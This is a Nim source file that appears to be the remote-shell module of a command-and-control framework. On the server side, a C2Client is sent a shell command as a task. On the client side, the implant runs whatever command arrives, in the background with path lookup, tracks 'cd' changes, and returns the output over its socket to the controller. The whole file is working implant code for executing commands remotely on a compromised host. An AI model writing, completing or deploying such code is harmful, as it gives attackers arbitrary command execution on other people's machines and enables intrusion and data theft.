when defined(server):
  import asyncdispatch, json
  import ../server/[types, communication]

when defined(client):
  import osproc, os, net, strutils
  import ../client/communication

when defined(server):
  proc sendTask*(client: C2Client, cmd: string): Future[Task] {.async.} =
    return await client.sendClientTask("shell", %*{ "shellCmd": cmd })

when defined(client):
  proc executeTask*(socket: Socket, taskId: int, toExec: string) =
    try:
      let cmdSplit = toExec.split(" ") 
      if cmdSplit[0] == "cd":
        let newPath = cmdSplit[1..(cmdSplit.len() - 1)].join(" ")
        setCurrentDir(newPath)
        socket.sendOutput(taskId, "SHELL", "changed current working directory to " & newPath)
        return
      let (output, _) = execCmdEx(toExec, workingDir = getCurrentDir(), options={poUsePath, poStdErrToStdOut, poEvalCommand, poDaemon})
      socket.sendOutput(taskId, "SHELL", output)
    except OSError:
      socket.sendOutput(taskId, "SHELL", "", getCurrentExceptionMsg())
